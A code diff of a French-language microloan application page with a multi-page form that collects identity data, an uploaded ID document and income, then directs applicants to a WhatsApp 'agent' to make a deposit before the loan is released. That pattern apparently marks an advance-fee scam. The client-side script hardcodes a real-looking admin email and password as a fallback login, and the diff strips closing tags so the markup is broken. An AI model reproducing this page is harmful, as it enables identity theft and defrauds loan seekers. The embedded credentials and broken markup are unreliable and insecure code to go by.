@@ -90,8 +90,8 @@ footer{margin-top:16px;color:rgba(234,240,255,.58);font-size:12px;text-align:cen
         <h2 style="font-size:18px">Informations personnelles</h2>
         <p>Remplissez le formulaire. Une fois soumis, activez votre dossier via WhatsApp.</p>
         <div class="steps">
-          <div class="step"><div class="k">1) Donn&eacute;es personnelles</div><div class="d">Infos d'identit&eacute; et contact.</div></div>
-          <div class="step"><div class="k">2) Projet &amp; capacit&eacute;</div><div class="d">Objectif du pr&ecirc;t.</div></div>
+          <div class="step"><div class="k">1) Donn&eacute;es personnelles</div><div class="d">Infos d'identit&eacute; et contact.</div>
+          <div class="step"><div class="k">2) Projet &amp; capacit&eacute;</div><div class="d">Objectif du pr&ecirc;t.</div>
         </div>
 
       <form id="loanForm">
@@ -108,12 +108,10 @@ footer{margin-top:16px;color:rgba(234,240,255,.58);font-size:12px;text-align:cen
               <div class="full"><label>T&eacute;l&eacute;phone (obligatoire)</label><input name="phone" type="tel" required placeholder="Ex: +225..."></div>
               <div class="full"><label>Type de document</label><select name="idDoc" required><option value="CNI">CNI</option><option value="Passeport">Passeport</option><option value="Permis">Permis</option><option value="Autre">Autre</option></select></div>
               <div class="full"><label>Document d'identit&eacute; (PDF/JPG/PNG)</label><input name="idDocFile" type="file" accept="application/pdf,image/png,image/jpeg" required></div>
-            </div>
             <div class="pageNav">
               <div></div>
               <button class="btnSecondary" type="button" onclick="nextPage()">Suivant</button>
             </div>
-          </div>
 
           <!-- PAGE 2 -->
           <div class="formPage hidden" data-page="2">
@@ -123,12 +121,10 @@ footer{margin-top:16px;color:rgba(234,240,255,.58);font-size:12px;text-align:cen
               <div class="full"><label>Statut</label><select name="jobType" required><option value="Salari&eacute;">Salari&eacute;</option><option value="Ind&eacute;pendant">Ind&eacute;pendant</option><option value="Entrepreneur">Entrepreneur</option></select></div>
               <div class="full"><label>Revenu mensuel</label><select name="incomeMonthly" required><option value="Moins de 100 000 FCFA">Moins de 100 000 FCFA</option><option value="100 000 &agrave; 300 000 FCFA">100 000 &agrave; 300 000 FCFA</option><option value="300 001 &agrave; 500 000 FCFA">300 001 &agrave; 500 000 FCFA</option><option value="Plus de 500 000 FCFA">Plus de 500 000 FCFA</option></select></div>
               <div class="full"><label>Autre source de revenus ?</label><select name="otherIncome" required><option value="Oui">Oui</option><option value="Non">Non</option></select></div>
-            </div>
             <div class="pageNav">
               <button class="btnSecondary" type="button" onclick="prevPage()">Pr&eacute;c&eacute;dent</button>
               <button class="btnSecondary" type="button" onclick="nextPage()">Suivant</button>
             </div>
-          </div>
 
           <!-- PAGE 3 -->
           <div class="formPage hidden" data-page="3">
@@ -138,24 +134,20 @@ footer{margin-top:16px;color:rgba(234,240,255,.58);font-size:12px;text-align:cen
               <div class="full"><label>Dur&eacute;e</label><select name="repaymentTerm" required><option value="3 mois">3 mois</option><option value="6 mois">6 mois</option><option value="12 mois">12 mois</option><option value="24 mois">24 mois</option></select></div>
               <div class="full"><label>D&eacute;j&agrave; eu un pr&ecirc;t ?</label><select name="previousLoan" required><option value="Oui">Oui</option><option value="Non">Non</option></select></div>
               <div class="full"><label>Objet (r&eacute;sum&eacute;)</label><textarea name="purpose" required placeholder="Ex: stock, &eacute;quipement..."></textarea></div>
-            </div>
             <div class="pageNav">
               <button class="btnSecondary" type="button" onclick="prevPage()">Pr&eacute;c&eacute;dent</button>
               <button class="btnSecondary" type="button" onclick="nextPage()">Suivant</button>
             </div>
-          </div>
 
           <!-- PAGE 4 -->
           <div class="formPage hidden" data-page="4">
             <div class="formGrid">
               <div class="full"><h2 style="font-size:18px;margin-top:10px">Consentement</h2></div>
               <div class="full"><label>Consentement</label><select name="agree" required><option value="Oui">Oui, j'autorise</option><option value="Non">Non</option></select></div>
-            </div>
             <div class="pageNav">
               <button class="btnSecondary" type="button" onclick="prevPage()">Pr&eacute;c&eacute;dent</button>
               <button class="btn" type="submit" id="submitBtn">Soumettre</button>
             </div>
-          </div>
 
         </div>
       </form>
@@ -174,7 +166,6 @@ footer{margin-top:16px;color:rgba(234,240,255,.58);font-size:12px;text-align:cen
             <div style="color:var(--muted);margin-bottom:14px;">Cliquez sur le lien ci-dessous. Il ouvrira directement une discussion s&eacute;curis&eacute;e avec notre service client sur WhatsApp. Notre agent vous expliquera comment proc&eacute;der &agrave; votre d&eacute;p&ocirc;t en toute s&eacute;curit&eacute; :</div>
             <a id="waSuccessBtn" class="waBig" target="_blank" rel="noopener noreferrer" style="display:block;width:100%;padding:18px;background:#25D366;border:2px solid #128C7E;border-radius:14px;font-weight:900;font-size:16px;color:white;text-align:center;text-decoration:none;">💬 Activer mon compte via WhatsApp</a>
             <div style="margin-top:16px;color:var(--text);font-weight:600;font-size:14px;">🛡️ Soyez rassur&eacute;(e), votre dossier est entre de bonnes mains. D&egrave;s que vous aurez contact&eacute; notre agent via le lien ci-dessus, le transfert de votre cr&eacute;dit sera programm&eacute;. Merci de votre confiance et bienvenue chez nous.</div>
-          </div>
         </div>
     </section>
 
@@ -188,7 +179,6 @@ footer{margin-top:16px;color:rgba(234,240,255,.58);font-size:12px;text-align:cen
           <div class="muted">Apr&egrave;s validation, un conseiller active votre cr&eacute;dit.</div>
           <div class="whatsapp">
             <div class="waLeft"><div class="h">WhatsApp Admin</div><div class="p">Activation dossier</div>
-          </div>
           <div class="miniItem" style="border-color:rgba(96,165,250,.35);background:rgba(96,165,250,.07)">
             <div class="t">&#128274; Acc&egrave;s Administrateur</div>
             <div class="s">Voir les r&eacute;ponses utilisateurs</div>
@@ -281,7 +271,6 @@ function showAdmin(){
   if(publicView) publicView.classList.add('hidden');
   if(adminView) adminView.classList.remove('hidden');
   try{ location.hash = '#admin'; }catch(e){}
-  // Charger les réponses depuis l'API si connecté
   if(loadAuth()) renderResponses();
 }
 function backPublic(){
@@ -400,13 +389,11 @@ document.getElementById('loanForm').addEventListener('submit',function(e){
       loanAmount:data.loanAmount,repaymentTerm:data.repaymentTerm,
       previousLoan:data.previousLoan,purpose:data.purpose,agree:data.agree
     };
-    // Sauvegarde locale (fallback)
     var list=loadResp();
     var idx=list.findIndex(function(r){return r.email?.toLowerCase()===email.toLowerCase()});
     if(idx>-1)list[idx]=rec;else list.push(rec);
     saveResp(list);
 
-    // Envoi au serveur central (API)
     fetch('/api/submit',{
       method:'POST',
       headers:{'Content-Type':'application/json'},
@@ -424,7 +411,6 @@ document.getElementById('loanForm').addEventListener('submit',function(e){
       console.warn('Serveur inaccessible - données sauvegardées localement uniquement');
     });
 
-    // Afficher le message de succès
     document.getElementById('loanForm').style.display='none';
     document.getElementById('successOverlay').style.display='block';
     document.getElementById('successUserLine').textContent='Bonjour '+(data.fullName||'')+' -- votre demande a ete enregistree.';
@@ -433,7 +419,6 @@ document.getElementById('loanForm').addEventListener('submit',function(e){
   reader.readAsDataURL(f);
 });
 
-// Admin login submit handler
 document.getElementById('adminLogin').addEventListener('submit', async function(e) {
   e.preventDefault();
   const email = document.getElementById('adminEmail').value.trim();
@@ -442,10 +427,8 @@ document.getElementById('adminLogin').addEventListener('submit', async function(
     toast('Champs requis', 'Remplissez email et mot de passe.', 'err');
     return;
   }
-  // Vrais identifiants administrateur
   const ADMIN_EMAIL = 'wabogeovani02@gmail.com';
   const ADMIN_PASSWORD = 'VaNeLlE@20';
-  // Try API login (when deployed on Vercel)
   try {
     const res = await fetch('/api/login', {
       method: 'POST',
@@ -466,7 +449,6 @@ document.getElementById('adminLogin').addEventListener('submit', async function(
       return;
     }
   } catch(e) {
-    // Fallback local: vérifier avec les vrais identifiants
     if (email === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
       saveAuth();
       document.getElementById('adminArea').style.display = 'block';
@@ -483,7 +465,6 @@ async function renderResponses(){
   if(!loadAuth())return;
   var tok=localStorage.getItem('admin_token');
   var items=[];
-  var apiSuccess = false;
   if(tok){
     try{
       var filter=document.getElementById('filterEmail')?.value||'';
@@ -492,7 +473,6 @@ async function renderResponses(){
       var d=await res.json();
       if(d.success&&d.submissions){
         items=d.submissions;
-        apiSuccess = true;
         renderTable(items);
         document.getElementById('detailTitle').textContent='Detail';
         document.getElementById('detailBody').textContent='Selectionnez une reponse.';
@@ -502,7 +482,6 @@ async function renderResponses(){
       console.warn('API inaccessible, utilisation des données locales');
     }
   }
-  // Fallback: données locales uniquement
   items=loadResp().sort(function(a,b){return new Date(b.createdAt)-new Date(a.createdAt)});
   var filter=(document.getElementById('filterEmail')?.value||'').toLowerCase();
   if(filter)items=items.filter(function(r){return (r.email||'').toLowerCase().includes(filter)});
